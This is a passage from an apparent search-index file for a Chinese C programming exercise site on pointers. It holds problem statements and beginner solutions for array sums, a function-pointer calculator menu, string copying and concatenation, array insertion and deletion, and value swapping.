printf(\"\u6240\u6709\u5143\u7d20\u4e4b\u548c\u4e3a\uff1a%d\\n\", sum);\n}\nvoid SumM(int a[][N])\n{\n    int i, summ = 0;\n    for (i = 0; i &lt; N; i++)\n        summ = summ + a[i][i];\n    printf(\"\u4e3b\u5bf9\u89d2\u7ebf\u5143\u7d20\u4e4b\u548c\u4e3a\uff1a%d\\n\", summ);\n}\nvoid SumS(int a[][N])\n{\n    int i, sums = 0;\n    for (i = 0; i &lt; N; i++)\n        sums = sums + a[i][N - 1 - i];\n    printf(\"\u6b21\u5bf9\u89d2\u7ebf\u5143\u7d20\u4e4b\u548c\u4e3a\uff1a%d\\n\", sums);\n}\nvoid Pro(int a[][N], void (*fun)(int a[][N]))\n{\n    //\u8c03\u7528\u5404\u529f\u80fd\u51fd\u6570\n    (*fun)(a);\n}\nvoid ShowMenu()\n{\n    //\u663e\u793a\u83dc\u5355\n    printf(\"\\t***************************************\\n\");\n    printf(\"\\t*\\t                              *\\n\");\n    printf(\"\\t*\\t\\t\u529f\u80fd\u83dc\u5355              *\\n\");\n    printf(\"\\t*\\t1.\u6c42\u6240\u6709\u5143\u7d20\u4e4b\u548c              *\\n\");\n    printf(\"\\t*\\t2.\u6c42\u4e3b\u5bf9\u89d2\u7ebf\u5143\u7d20\u4e4b\u548c          *\\n\");\n    printf(\"\\t*\\t3.\u6c42\u6b21\u5bf9\u89d2\u7ebf\u5143\u7d20\u4e4b\u548c          *\\n\");\n    printf(\"\\t*\\t0.\u9000\u51fa                         *\\n\");\n    printf(\"\\t***************************************\\n\");\n}\nint Select(int i, int a[][N])\n{\n    //\u83dc\u5355\u9009\u62e9\n    switch (i)\n    {\n    case 1:\n        Pro(a, Sum);\n        break;\n    case 2:\n        Pro(a, SumM);\n        break;\n    case 3:\n        Pro(a, SumS);\n        break;\n    case 0:\n        printf(\"\u611f\u8c22\u4f7f\u7528\uff0c\u518d\u89c1\uff01\\n\");\n    }\n    if (i)\n    {\n        printf(\"\u6309\u4efb\u610f\u952e\u7ee7\u7eed\u2026\u2026\\n\");\n        getchar();\n    }\n    return !i;\n}\nint main()\n{\n    int i, a[N][N] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16};\n    while (1)\n    {\n        system(\"clear\");\n        ShowMenu();\n        printf(\"\u8bf7\u8f93\u5165\u4f60\u7684\u9009\u62e9\uff081,2,3,0\uff09\uff1a\");\n        scanf(\"%d\", &amp;i);\n        fflush(stdin); \n        if (i &gt;= 0 &amp;&amp; i &lt;= 3)\n            if (Select(i, a))\n                break;\n    }\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E6%8C%87%E9%92%88/#11","title":"11","text":"<p>**\u4f7f\u7528\u6307\u9488\u5b9e\u73b0\u7b80\u6613\u8ba1\u7b97\u5668   **</p> <p>\u7f16\u7a0b\u5b9e\u73b0\uff1a\u7f16\u5199\u4e00\u4e2a\u7b80\u6613\u8ba1\u7b97\u5668\u7a0b\u5e8f\uff0c\u5b9e\u73b0\u6574\u6570\u7684\u52a0\u6cd5\u3001\u51cf\u6cd5\u3001\u4e58\u6cd5\u8fd0\u7b97\u3002\u8981\u6c42\u8bbe\u8ba1\u4e00\u4e2a\u529f\u80fd\u83dc\u5355\uff0c\u7528\u6237\u6839\u636e\u83dc\u5355\u8fdb\u884c\u529f\u80fd\u9009\u62e9\uff0c\u7a0b\u5e8f\u6839\u636e\u7528\u6237\u7684\u9009\u62e9\u4f7f\u7528\u51fd\u6570\u6307\u9488\u4f5c\u4e3a\u51fd\u6570\u53c2\u6570\u8c03\u7528\u76f8\u5e94\u7684\u529f\u80fd\u51fd\u6570\u3002</p> C<pre><code>/*\n \u6709\u4e24\u4e2a\u7248\u672c\u4f9b\u53c2\u8003\uff1a\n \u7248\u672c1: \u53ef\u4ee5\u901a\u8fc7\u6d4b\u8bd5\u7684\u7248\u672c\uff0c\u4f46\u6ca1\u6709\u9898\u5e72\u4e2d\u63cf\u8ff0\u7684\u8f93\u51fa\u4fe1\u606f\uff0c\u4e0d\u4f7f\u7528\u65e0\u9650\u5faa\u73af\n \u7248\u672c2: \u663e\u793a\u66f4\u591a\u4fe1\u606f\uff0c\u50cf\u9898\u5e72\u63cf\u8ff0\u7684\u90a3\u6837\u3002\u4f46\u9700\u8981\u5728\u672c\u5730\u8fd0\u884c\uff0c\u56e0\u4e3a\u4f7f\u7528\u4e86\u65e0\u9650\u5faa\u73af\n*/\n\n/************** \u7248\u672c1 **************/ \n#include \"stdio.h\"\n//#include \"conio.h\"  conio.h\u4e0d\u662f\u6807\u51c6\u5e93\u5934\u6587\u4ef6\uff0c\u5e73\u53f0\u4e0d\u652f\u6301\uff0c\u5982\u9700\u4f7f\u7528\uff0c\u8bf7\u5728\u672c\u5730\u7f16\u8bd1\u5668\u8c03\u8bd5\n#include &lt;stdlib.h&gt;\nint Sum(int a,int b) {\n    //\u52a0\u6cd5\n    return a+b;\n}\nint Sub(int a,int b) {\n    //\u51cf\u6cd5\n    return a-b;\n}\nint Mul(int a,int b) {\n    //\u4e58\u6cd5\n    return a*b;\n}\nint Pro(int a,int b,int (*fun)(int,int)) {\n    //\u8c03\u7528\u5404\u529f\u80fd\u51fd\u6570\n    return (*fun)(a,b);\n}\nvoid ShowMenu() {\n    //\u663e\u793a\u83dc\u5355\n    printf(\"\\t*********************************\\n\");\n    printf(\"\\t*     \u7b80\u6613\u8ba1\u7b97\u5668       *\\n\");\n    printf(\"\\t* 1.\u52a0\u6cd5        2.\u51cf\u6cd5    *\\n\");\n    printf(\"\\t* 3.\u4e58\u6cd5        0.\u9000\u51fa    *\\n\");\n    printf(\"\\t*********************************\\n\");\n}\nint Select(int i) {\n    //\u83dc\u5355\u9009\u62e9\n    int x,y,(*str[3])(int,int)= {Sum,Sub,Mul};\n    char Op[3]= {'+','-','*'};\n    if(i) {\n        //printf(\"\u8bf7\u8f93\u5165\u4e24\u4e2a\u6574\u6570\uff0c\u4ee5\u7a7a\u683c\u5206\u5f00\uff1a\");\n        scanf(\"%d%d\",&amp;x,&amp;y);\n        printf(\"%d %c %d = %d\\n\",x,Op[i-1],y,Pro(x,y,str[i-1]));\n    } else {\n        //printf(\"\u611f\u8c22\u4f7f\u7528\u672c\u8ba1\u7b97\u5668\uff0c\u518d\u89c1\uff01\\n\");\n        return 1;\n    }\n    //printf(\"\u6309\u4efb\u610f\u952e\u7ee7\u7eed\u2026\u2026\");\n    //getchar();\n    return 0;\n}\nint main() {\n    int i;\n//        ShowMenu();\n//        printf(\"\u8bf7\u8f93\u5165\u4f60\u7684\u9009\u62e9\uff081,2,3,0\uff09\uff1a\");\n        scanf(\"%d\",&amp;i);   \n        if(i&gt;=0&amp;&amp;i&lt;=3)\n            if(Select(i))\n                return 0;\n    return 0;\n}\n/************** \u7248\u672c1 \u7ed3\u675f **************/\n\n\n\n/************** \u7248\u672c2 **************/\n#include \"stdio.h\"\n//#include \"conio.h\"  conio.h\u4e0d\u662f\u6807\u51c6\u5e93\u5934\u6587\u4ef6\uff0c\u5e73\u53f0\u4e0d\u652f\u6301\uff0c\u5982\u9700\u4f7f\u7528\uff0c\u8bf7\u5728\u672c\u5730\u7f16\u8bd1\u5668\u8c03\u8bd5\n#include &lt;stdlib.h&gt;\nint Sum(int a,int b) {\n    //\u52a0\u6cd5\n    return a+b;\n}\nint Sub(int a,int b) {\n    //\u51cf\u6cd5\n    return a-b;\n}\nint Mul(int a,int b) {\n    //\u4e58\u6cd5\n    return a*b;\n}\nint Pro(int a,int b,int (*fun)(int,int)) {\n    //\u8c03\u7528\u5404\u529f\u80fd\u51fd\u6570\n    return (*fun)(a,b);\n}\nvoid ShowMenu() {\n    //\u663e\u793a\u83dc\u5355\n    printf(\"\\t*********************************\\n\");\n    printf(\"\\t*     \u7b80\u6613\u8ba1\u7b97\u5668       *\\n\");\n    printf(\"\\t* 1.\u52a0\u6cd5        2.\u51cf\u6cd5    *\\n\");\n    printf(\"\\t* 3.\u4e58\u6cd5        0.\u9000\u51fa    *\\n\");\n    printf(\"\\t*********************************\\n\");\n}\nint Select(int i) {\n    //\u83dc\u5355\u9009\u62e9\n    int x,y,(*str[3])(int,int)= {Sum,Sub,Mul};\n    char Op[3]= {'+','-','*'};\n    if(i) {\n        printf(\"\u8bf7\u8f93\u5165\u4e24\u4e2a\u6574\u6570\uff0c\u4ee5\u7a7a\u683c\u5206\u5f00\uff1a\");\n        scanf(\"%d%d\",&amp;x,&amp;y);\n        printf(\"\\t%d %c %d = %d\\n\",x,Op[i-1],y,Pro(x,y,str[i-1]));\n    } else {\n        printf(\"\u611f\u8c22\u4f7f\u7528\u672c\u8ba1\u7b97\u5668\uff0c\u518d\u89c1\uff01\\n\");\n        return 1;\n    }\n    printf(\"\u6309\u4efb\u610f\u952e\u7ee7\u7eed\u2026\u2026\");\n    getchar();\n    return 0;\n}\nint main() {\n    int i;\n    while(1) {\n        system(\"clear\");\n        ShowMenu();\n        printf(\"\u8bf7\u8f93\u5165\u4f60\u7684\u9009\u62e9\uff081,2,3,0\uff09\uff1a\");\n        scanf(\"%d\",&amp;i);   \n        if(i&gt;=0&amp;&amp;i&lt;=3)\n            if(Select(i))\n                break;\n    }\n    return 0;\n}\n/************** \u7248\u672c2 \u7ed3\u675f **************/\n</code></pre>"},{"location":"DEC/C/Alpha-%E6%8C%87%E9%92%88/#12","title":"12","text":"<p>\u4f7f\u7528\u6307\u9488\u5b9e\u73b0\u5b57\u7b26\u4e32\u590d\u5236</p> <p>\u7f16\u7a0b\u5b9e\u73b0\uff1a\u7f16\u5199\u51fd\u6570void StrCopy(char ps1, char ps2)\uff0c\u5176\u529f\u80fd\uff1a\u628a\u5b57\u7b26\u4e32ps2\u7684\u5185\u5bb9\u590d\u5236\u5230\u5b57\u7b26\u4e32ps1\u4e2d\uff0c\u8981\u6c42\u4e0d\u80fd\u4f7f\u7528strcpy\u51fd\u6570\u3002\u4e3b\u51fd\u6570\u8f93\u5165\u4e24\u4e2a\u5b57\u7b26\u4e32\u548c\u8c03\u7528StrCopy\u51fd\u6570\u8f93\u51fa\u590d\u5236\u540eps1\u7684\u5b57\u7b26\u4e32\u3002</p> C<pre><code>#include \"stdio.h\"\n#define N 30\nvoid StrCopy(char *ps1, char *ps2) {\n    while(*ps2)\n        *ps1++=*ps2++;\n    *ps1='\\0';\n}\nint main() {\n    char str1[N],str2[N];\n    printf(\"\u8bf7\u8f93\u5165\u4e24\u4e2a\u5b57\u7b26\u4e32\uff1a\\n\");\n    scanf(\"%s%s\",str1,str2);\n    StrCopy(str1,str2);\n    printf(\"\u590d\u5236\u540e\u7684\u5b57\u7b26\u4e32\u4e3a\uff1a\\n\");\n    puts(str1);\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E6%8C%87%E9%92%88/#13","title":"13","text":"<p>\u4f7f\u7528\u6307\u9488\u5b9e\u73b0\u5b57\u7b26\u4e32\u8fde\u63a5</p> <p>\u7f16\u7a0b\u5b9e\u73b0\uff1a\u7f16\u5199\u51fd\u6570<code>void StrCat(char *ps1, char *ps2)</code>\u5c06\u5b57\u7b26\u4e32ps2\u8fde\u63a5\u5230\u5b57\u7b26\u4e32ps1\u7684\u540e\u9762\u3002\u4e3b\u51fd\u6570\u8f93\u5165\u4e24\u4e2a\u5b57\u7b26\u4e32\u548c\u8c03\u7528StrCat\u51fd\u6570\u8f93\u51fa\u8fde\u63a5\u540e\u7684\u5b57\u7b26\u4e32</p> C<pre><code>#include \"stdio.h\"\n#define N 30\nvoid StrCat(char *ps1,char *ps2) {\n    for(; *ps1; ps1++);\n    for(; *ps2; ps1++,ps2++)\n        *ps1=*ps2;\n    *ps1='\\0';\n}\nint main() {\n    char str1[N],str2[N];\n    printf(\"\u8bf7\u8f93\u5165\u4e24\u4e2a\u5b57\u7b26\u4e32\uff1a\\n\");\n    scanf(\"%s%s\",str1,str2);\n    StrCat(str1,str2);\n    printf(\"\u8fde\u63a5\u540e\u7684\u5b57\u7b26\u4e32\u4e3a\uff1a\\n\");\n    puts(str1);\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E6%8C%87%E9%92%88/#14","title":"14","text":"<p>\u4f7f\u7528\u6307\u9488\u5b9e\u73b0\u5220\u9664\u6570\u7ec4\u4e2d\u6307\u5b9a\u5143\u7d20</p> <p>\u7f16\u7a0b\u5b9e\u73b0\uff1a\u7f16\u5199\u4e00\u4e2a\u51fd\u6570<code>void Delete(int *a,int i)</code>\uff0c\u7528\u4e8e\u5b9e\u73b0\u5220\u9664\u6570\u7ec4a\u4e2d\u7b2ci\u4e2a\u5143\u7d20\u3002</p> C<pre><code>#include \"stdio.h\"\n#define N 10\nvoid Delete(int *a,int i) {\n    for(; i&lt;N-1; i++)\n        *(a+i)=*(a+i+1);\n}\nint main() {\n    int a[N],i,n;\n    printf(\"\u8bf7\u8f93\u5165%d\u4e2a\u6574\u6570:\",N);\n    for(i=0; i&lt;N; i++)\n        scanf(\"%d\",&amp;a[i]);\n    printf(\"\u8bf7\u8f93\u5165\u5220\u9664\u6570\u7ec4\u4e2d\u7b2c\u51e0\u4e2a\u5143\u7d20\uff1a\");\n    scanf(\"%d\",&amp;n);\n    Delete(a,n);\n    printf(\"\u5220\u9664\u6570\u7ec4\u4e2d\u7b2c%d\u4e2a\u5143\u7d20\u540e\u7684\u6570\u636e\u4e3a\uff1a\\n\",n);\n    for(i=0; i&lt;N-1; i++)\n        printf(\"%d \",a[i]);\n    printf(\"\\n\");\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E6%8C%87%E9%92%88/#15","title":"15","text":"<p>\u4f7f\u7528\u6307\u9488\u5b9e\u73b0\u6709\u5e8f\u6570\u7ec4\u7684\u63d2\u5165</p> <p>\u7f16\u7a0b\u5b9e\u73b0\uff1a\u4f7f\u7528\u6307\u9488\u5728\u6309\u5347\u5e8f\u6392\u5e8f\u7684\u6570\u7ec4\u4e2d\u63d2\u5165\u4e00\u4e2a\u6570\u636ex\uff0c\u4f7f\u63d2\u5165\u540e\u7684\u6570\u7ec4\u4ecd\u7136\u6709\u5e8f\u3002</p> C<pre><code>#include \"stdio.h\"\n#define N 10\nvoid Insert(int *p, int x) {\n    //\u5728\u6709\u5e8f\u7684\u6570\u7ec4\u4e2d\u63d2\u5165\u4e00\u4e2a\u6570\u636e\uff0c\u63d2\u5165\u540e\u7684\u6570\u7ec4\u4ecd\u7136\u6709\u5e8f\n    int i,j;\n    for(i=0; i&lt;N-1 &amp;&amp; *(p+i)&lt;x; i++);   //\u67e5\u627e\u6570\u636ex\u5e94\u63d2\u5165\u7684\u4f4d\u7f6ei\n    for(j=N-2; j&gt;=i; j--)   //\u5c06\u4e0b\u6807\u4e3ai\u5230n-1\u7684\u6240\u6709\u5143\u7d20\u540e\u79fb\u4e00\u4f4d\n        p[j+1]=p[j];\n    p[i]=x; //\u5c06\u6570\u636ex\u63d2\u5165\u5230\u6570\u7ec4\u4e2d\n}\nvoid Output(int a[],int n) {\n    //\u8f93\u51fa\u6570\u7ec4\u7684\u5168\u90e8\u5143\u7d20\n    int i;\n    for(i=0; i&lt;n; i++)\n        printf(\"%4d\",a[i]);\n    printf(\"\\n\");\n}\nint main() {\n    int a[N]= {1,4,5,7,19,20,34,56,78},x;\n    printf(\"\u8bf7\u8f93\u5165\u8981\u63d2\u5165\u7684\u6570\u636e\uff1a\");\n    scanf(\"%d\",&amp;x);\n    printf(\"\u539f\u6570\u7ec4\u4e3a\uff1a\\n\");\n    Output(a,N-1);  //\u8f93\u51fa\u6570\u636e\u63d2\u5165\u524d\u7684\u5168\u90e8\u6570\u7ec4\u5143\u7d20\n    Insert(a, x);       //\u63d2\u5165\u6570\u636e\n    printf(\"\u63d2\u5165%d\u540e\u7684\u6570\u7ec4\u4e3a\uff1a\\n\",x);\n    Output(a,N);        //\u8f93\u51fa\u6570\u636e\u63d2\u5165\u540e\u7684\u5168\u90e8\u6570\u7ec4\u5143\u7d20\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E6%8C%87%E9%92%88/#16","title":"16","text":"<p>\u4f7f\u7528\u6307\u9488\u6c42\u5b57\u7b26\u4e32\u4e2d\u6700\u5927\u5b57\u7b26\u7684\u5730\u5740</p> <p>\u7f16\u7a0b\u5b9e\u73b0\uff1a\u7f16\u5199\u51fd\u6570<code>char *MaxChar(char *str)</code>\uff0c\u6c42\u5b57\u7b26\u4e32str\u4e2d\u6700\u5927\u5b57\u7b26\u7684\u5730\u5740\u5e76\u8fd4\u56de\u8be5\u5730\u5740\u3002</p> C<pre><code>#include \"stdio.h\"\n#define N 50 \nchar *MaxChar(char *str) {\n    char *maxp=str;\n    while(*str++)\n        if(*maxp&lt;*str)\n            maxp=str;\n    return maxp;\n}\nint main()\n{\n    char str1[N],*max;\n    printf(\"\u8bf7\u8f93\u5165\u5b57\u7b26\u4e32\uff1a\");\n    gets(str1);\n    max=MaxChar(str1);\n    printf(\"\u6700\u5927\u5b57\u7b26\u4e3a\uff1a%c\",*max); \n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E6%8C%87%E9%92%88/#17","title":"17","text":"<p>\u4f7f\u7528\u6307\u9488\u8f93\u51fa\u5bf9\u5e94\u7684\u661f\u671f\u540d</p> <p>\u7f16\u7a0b\u5b9e\u73b0\uff1a\u8f93\u51651\uff5e7\u4e4b\u95f4\u7684\u6574\u6570\uff0c\u8f93\u51fa\u5bf9\u5e94\u7684\u661f\u671f\u540d\u3002</p> C<pre><code>#include \"stdio.h\"\nchar *day_name(int n) {\n    char *name[]= {\"Illegal day\",\"Monday\",\"Tuesday\",\"Wednesday\", \"Thursday\",\"Friday\",\"Saturday\",\"Sunday\"};\n    return((n&lt;1||n&gt;7) ? name[0] : name[n]);\n}\nint main() {\n    int i;\n    printf(\"\u8bf7\u8f93\u5165\u4e00\u4e2a\u6574\u6570(1-7)\uff1a\");\n    scanf(\"%d\",&amp;i);\n    printf(\"%2d--&gt;%s\\n\",i,day_name(i));\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E6%8C%87%E9%92%88/#18","title":"18","text":"<p>\u6c42\u6570\u7ec4\u5143\u7d20\u4e4b\u548c\u3001\u6700\u5927\u503c\u3001\u6700\u5c0f\u503c</p> <p>\u7f16\u7a0b\u5b9e\u73b0\uff1a\u7f16\u5199\u51fd\u6570<code>int Sum(int a[])</code>\u3001<code>int Max(int a[])</code>\u3001<code>int Min(int a[])</code>\u548c<code>int Process(int a[],int (*fun)(int[]))</code>\uff0c\u5206\u522b\u6c42\u6570\u7ec4\u4e2d10\u4e2a\u5143\u7d20\u4e4b\u548c\u3001\u6700\u5927\u503c\u3001\u6700\u5c0f\u503c\uff0c\u901a\u8fc7\u8c03\u7528\u51fd\u6570Process\u5b9e\u73b0\u8c03\u7528\u51fd\u6570Sum\u3001Max\u548cMin\u3002</p> C<pre><code>#include \"stdio.h\"\n#define N 10\nint Sum(int a[]) {\n    int sum=0,i;\n    for(i=0; i&lt;N; i++)\n        sum=sum+a[i];\n    return sum;\n}\nint Max(int a[]) {\n    int max=a[0],i;\n    for(i=1; i&lt;N; i++)\n        if(a[i]&gt;max)\n            max=a[i];\n    return max;\n}\nint Min(int a[]) {\n    int min=a[0],i;\n    for(i=1; i&lt;N; i++)\n        if(a[i]&lt;min)\n            min=a[i];\n    return min;\n}\nint Process(int a[],int (*fun)(int *)) {\n    return (*fun)(a);\n}\nint main() {\n    int a[N],i;\n    printf(\"\u8bf7\u8f93\u5165%d\u4e2a\u6574\u6570:\",N);\n    for(i=0; i&lt;N; i++)\n        scanf(\"%d\",&amp;a[i]);\n    printf(\"\u5143\u7d20\u4e4b\u548c:%d\\n\",Process(a,Sum));\n    printf(\"\u6700\u5927\u503c:%d\\n\",Process(a,Max));\n    printf(\"\u6700\u5c0f\u503c:%d\\n\",Process(a,Min));\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E6%8C%87%E9%92%88/#19","title":"19","text":"<p>\u4f7f\u7528\u6307\u9488\u6c42\u4e24\u4e2a\u6574\u6570\u7684\u6700\u5927\u503c\u548c\u6700\u5c0f\u503c</p> <p>\u7f16\u7a0b\u5b9e\u73b0\uff1a\u7f16\u5199\u51fd\u6570<code>int Max(int a,int b)</code>\u3001<code>int Min(int a,int b)</code>\u548c<code>int Process(int a,int b,int (*fun)(int,int))</code>\uff0c\u5206\u522b\u6c42\u4e24\u4e2a\u6574\u6570a\u4e0eb\u7684\u6700\u5927\u503c\u3001\u6700\u5c0f\u503c\uff0c\u901a\u8fc7\u8c03\u7528\u51fd\u6570Process\u5b9e\u73b0\u8c03\u7528\u51fd\u6570Max\u548cMin\u3002</p> C<pre><code>#include \"stdio.h\"\nint Max(int a,int b) {\n    return a&gt;b?a:b;\n}\nint Min(int a,int b) {\n    return a&lt;b?a:b;\n}\nint Process(int a,int b,int (*fun)(int,int)) {\n    return (*fun)(a,b);\n}\nint main() {\n    int a,b,max,min;\n    printf(\"\u8bf7\u8f93\u5165\u4e24\u4e2a\u6574\u6570:\\n\");\n    scanf(\"%d%d\",&amp;a,&amp;b);\n    max=Process(a,b,Max);\n    printf(\"\u6700\u5927\u503c:%d\\n\",max);\n    min=Process(a,b,Min);\n    printf(\"\u6700\u5c0f\u503c:%d\\n\",min);\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E6%8C%87%E9%92%88/#20","title":"20","text":"<p>\u4f7f\u7528\u6307\u9488\u6c42\u4e00\u7ec4\u6574\u6570\u7684\u6700\u5927\u503c\u548c\u6700\u5c0f\u503c</p> <p>\u7f16\u7a0b\u5b9e\u73b0\uff1a\u6c42\u4e00\u7ec45\u4e2a\u6574\u6570\u7684\u6700\u5927\u503c\u548c\u6700\u5c0f\u503c\u3002\u8981\u6c42\uff1a\u7f16\u5199\u51fd\u6570<code>void Input(int a[])</code>\u5b9e\u73b0\u4e00\u7ec4\u6574\u6570\u7684\u8f93\u5165\uff0c\u7f16\u5199\u51fd\u6570<code>int Maxmin(int a[],int *pmax,int *pmin)</code>\u5b9e\u73b0\u6c42\u4e00\u7ec4\u6574\u6570\u7684\u6700\u5927\u503c\u548c\u6700\u5c0f\u503c\u3002</p> C<pre><code>#include \"stdio.h\"\n#define N 5\nvoid Input(int a[]) {\n    int i;\n    printf(\"\u8bf7\u8f93\u5165%d\u4e2a\u6574\u6570\uff1a\\n\",N);\n    for(i=0; i&lt;N; i++)\n        scanf(\"%d\",&amp;a[i]);\n}\nint Maxmin(int a[],int *pmax,int *pmin) {\n    int i;\n    *pmax=*pmin=a[0];\n    for(i=1; i&lt;N; i++) {\n        if(a[i]&gt;*pmax)\n            *pmax=a[i];\n        if(a[i]&lt;*pmin)\n            *pmin=a[i];\n    }\n    return 0;\n}\nint main() {\n    int a[N],pmax,pmin;\n    Input(a);\n    Maxmin(a,&amp;pmax,&amp;pmin);\n    printf(\"\u6700\u5927\u503c\u4e3a\uff1a%d,\u6700\u5c0f\u503c\u4e3a\uff1a%d\\n\",pmax,pmin);\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E6%8C%87%E9%92%88/#21","title":"21","text":"<p>\u4ea4\u6362\u5f62\u53c2\u6307\u9488\u53d8\u91cf\u7684\u6307\u5411</p> <p>\u7f16\u7a0b\u5b9e\u73b0\uff1a\u4f7f\u7528\u6307\u9488\u4ea4\u6362\u5f62\u53c2\u6307\u9488\u53d8\u91cf\u7684\u6307\u5411\uff0c\u6570\u636e\u7531\u4e3b\u51fd\u6570\u8f93\u5165\u3002</p> C<pre><code>    #include \"stdio.h\"\n    void swap1(int *p1,int *p2) {\n        int *temp;\n        printf(\"\u4ea4\u6362\u524d%d,%d\\n\",*p1,*p2);//\u4ea4\u6362\u524dp1\u6307\u5411a\uff0cp2\u6307\u5411b\n        temp=p1;\n        p1=p2;\n        p2=temp;\n        printf(\"\u4ea4\u6362\u540e%d,%d\\n\",*p1,*p2);//\u4ea4\u6362\u540ep1\u6307\u5411b\uff0cp2\u6307\u5411a\n    }\n    int main() {\n        int a,b,*p=&amp;a,*q=&amp;b;\n        printf(\"\u8bf7\u8f93\u5165\u4e24\u4e2a\u6574\u6570\uff1a\");\n        scanf(\"%d%d\",p,q);\n        swap1(p,q);\n        return 0;\n    }\n</code></pre>"},{"location":"DEC/C/Alpha-%E6%8C%87%E9%92%88/#22","title":"22","text":"<p>\u4f7f\u7528\u6307\u9488\u4ea4\u6362\u5b9e\u53c2\u53d8\u91cf\u7684\u503c</p> <p>\u7f16\u7a0b\u5b9e\u73b0\uff1a\u4f7f\u7528\u6307\u9488\u4ea4\u6362\u5b9e\u53c2\u53d8\u91cf\u7684\u503c\uff0c\u5b9e\u53c2\u53d8\u91cf\u4e3a\u6574\u578b\u6570\u636e\uff0c\u7531\u4e3b\u51fd\u6570\u8f93\u5165\u3002</p> C<pre><code>#include \"stdio.h\"\nvoid swap(int *p1,int *p2) {\n    int temp;\n    temp=*p1;\n    *p1=*p2;\n    *p2=temp;\n}\nint main() {\n    int a,b;\n    printf(\"\u8bf7\u8f93\u5165\u4e24\u4e2a\u6574\u6570\uff1a\");\n    scanf(\"%d%d\",&amp;a,&amp;b);\n    printf(\"\u4ea4\u6362\u524da=%d,b=%d\\n\",a,b);\n    swap(&amp;a,&amp;b);\n    printf(\"\u4ea4\u6362\u540ea=%d,b=%d\\n\",a,b);\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E6%8C%87%E9%92%88/#23","title":"23","text":"<p>\u6c42\u51fa\u6570\u7ec4\u7684\u6700\u5927\u5143\u7d20\u548c\u6700\u5c0f\u5143\u7d20</p> <p>\u7f16\u5199\u7a0b\u5e8f\uff0c\u5728\u4e3b\u51fd\u6570\u4e2d\u5b9a\u4e49\u4e00\u4e00\u7ef4\u6570\u7ec4\uff0c\u53e6\u4e00\u4e2a\u51fd\u6570\u7528\u6765\u6c42\u51fa\u6570\u7ec4\u7684\u6700\u5927\u5143\u7d20\u548c\u6700\u5c0f\u5143\u7d20\uff0c\u4f46\u5728\u4e3b\u51fd\u6570\u4e2d\u8f93\u51fa\u3002</p> C<pre><code>#include &lt;stdio.h&gt;\n#define N 10\nint fun(int *s,int *max) {\n    int i,mm;\n    mm=*max=*s;\n    for(i=1; i&lt;N; i++) {\n        if(*(s+i)&gt;*max)\n            *max=*(s+i);\n        if(*(s+i)&lt;mm)\n            mm=*(s+i);\n    }\n    return mm;\n}\nint main() {\n    int a[N]= {876,675,896,101,301,401,980,431,451,777},max,min;\n    min=fun(a,&amp;max);\n    printf(\"\u6700\u5927\u5143\u7d20=%d,\u6700\u5c0f\u5143\u7d20=%d\\n\",max,min);\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E6%8C%87%E9%92%88/#24","title":"24","text":"<p>\u5c06\u8f93\u5165\u7684\u4e00\u4e2a\u6b63\u6574\u6570\u4e2d\u6bcf\u4e00\u4f4d\u4e0a\u4e3a\u5947\u6570\u7684\u6570\u4f9d\u6b21\u53d6\u51fa\uff0c\u6784\u6210\u4e00\u4e2a\u65b0\u6570\u8f93\u51fa</p> <p>\u5c06\u8f93\u5165\u7684\u4e00\u4e2a\u6b63\u6574\u6570\u4e2d\u6bcf\u4e00\u4f4d\u4e0a\u4e3a\u5947\u6570\u7684\u6570\u4f9d\u6b21\u53d6\u51fa\uff0c\u6784\u6210\u4e00\u4e2a\u65b0\u6570\u8f93\u51fa\u3002\u9ad8\u4f4d\u4ecd\u5728\u9ad8\u4f4d\uff0c\u4f4e\u4f4d\u4ecd\u5728\u4f4e\u4f4d\u3002</p> C<pre><code>#include &lt;stdio.h&gt;\nvoid fun(int s,int *t) {\n    int d,s1=1;\n    *t=0;\n    while(s&gt;0) {\n        d=s%10;\n        if(d%2!=0) {\n            *t=d*s1+*t;\n            s1*=10 ;\n        }\n        s/=10;\n    }\n}\nint main() {\n    int s,t;\n    printf(\"\u8bf7\u8f93\u5165\u4e00\u4e2a\u6b63\u6574\u6570: \");\n    scanf(\"%d\",&amp;s);\n    fun(s,&amp;t);\n    printf(\"t=%d\\n\",t);\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E6%8C%87%E9%92%88/#25","title":"25","text":"<p>\u5c06\u5176\u4f59\u5b57\u7b26\u6309ASCII\u503c\u7801\u5347\u5e8f\u6392\u5217</p> <p>\u8f93\u5165\u4e00\u4e2a\u5b57\u7b26\u4e32\uff08\u957f\u5ea6\u4e0d\u8d85\u8fc780\u4e2a\u5b57\u7b26\uff09\uff0c\u9664\u9996\u3001\u5c3e\u5b57\u7b26\u5916\uff0c\u8bf7\u5c06\u5176\u4f59\u5b57\u7b26\u6309ASCII\u503c\u7801\u5347\u5e8f\u6392\u5217\u3002\u4f8b\u5982\uff1a\u539f\u6765\u7684\u5b57\u7b26\u4e32\u4e3aBdsihAd\uff0c\u5219\u6392\u5e8f\u540e\u8f93\u51fa\u4e3aBAdhisd\u3002</p> C<pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\nvoid fun(char *s, int num) {\n    char t;\n    int i, j;\n    for(i=1; i&lt;num-2; i++)  /*\u4e0b\u6807\u4ece1\u5f00\u59cb\uff0c\u7528\u5faa\u73af\u4f9d\u6b21\u53d6\u5f97\u5b57\u7b26\u4e32\u4e2d\u7684\u5b57\u7b26*/\n        for(j=i+1; j&lt;num-1; j++) /*\u5c06\u5b57\u7b26\u4e0e\u5176\u540e\u7684\u6bcf\u4e2a\u5b57\u7b26\u6bd4\u8f83*/\n            if(s[i]&gt;s[j]) {\n                t=s[i]; 